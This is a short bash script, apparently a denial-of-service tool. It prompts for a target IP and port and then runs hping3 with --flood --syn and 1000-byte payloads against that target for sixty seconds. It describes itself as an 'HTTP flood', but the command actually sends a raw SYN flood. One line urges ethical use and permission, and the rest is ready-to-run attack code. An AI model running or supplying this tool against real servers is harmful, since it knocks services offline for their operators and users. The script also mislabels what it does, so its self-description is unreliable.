#!/bin/bash

ask_input() {
  read -p "Enter the target IP: " target_ip
  read -p "Enter the target port (default 443): " target_port
}

http_flood() {
  timeout=60
  trap 'echo "Attack stopped by user."; exit 0' INT
  echo "Starting HTTP flood attack against $target_ip:$target_port for $timeout seconds."
  time sudo hping3 --flood --syn --data 1000 -p $target_port $target_ip &
  pid=$!
  sleep $timeout || wait $pid
  kill -9 $pid 2>/dev/null
  echo "Attack finished."
}

check_input() {
  if [[ -z $target_ip ]]; then
    echo "Invalid input. Please try again."
    ask_input
    check_input
  fi
  if [[ -z $target_port ]]; then
    target_port=443
  fi
}

echo "This script will perform a HTTP flood attack using hping3."
echo "Please be careful and ethical when using this script and do not attack any servers without permission."
ask_input
check_input
http_flood
